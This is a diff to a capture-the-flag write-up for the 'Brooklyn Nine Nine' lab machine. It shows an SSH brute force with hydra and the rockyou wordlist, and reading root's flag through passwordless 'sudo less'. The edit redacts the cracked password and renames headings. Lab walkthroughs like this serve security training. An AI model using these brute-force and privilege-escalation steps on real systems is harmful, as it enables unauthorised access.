@@ -8,7 +8,7 @@
 
 ## Enumeration
 
-- Nmap Initial
+### Nmap
 
 1. 21/ftp vsftpd 3.0.3
    - anonymous FTP login allowed
@@ -46,10 +46,10 @@ Jake please change your password. It is too weak and holt will be mad if someone
 
 ```
 $ hydra -l jake -P /usr/share/wordlists/rockyou.txt $IP ssh -t 4
-login: jake   password: 987654321
+login: jake   password: xxxxxxxx
 ```
 
-# Get User Access
+# User Access
 
 ```sh
 jake@brookly_nine_nine:~$ sudo -l
@@ -61,7 +61,11 @@ User jake may run the following commands on brookly_nine_nine:
     (ALL) NOPASSWD: /usr/bin/less
 
 jake@brookly_nine_nine:~$ cat /home/holt/user.txt
+```
 
+## Root Access
+
+```sh
 # read the /root/root.text with less command
 jake@brookly_nine_nine:~$ sudo less /root/root.txt
 
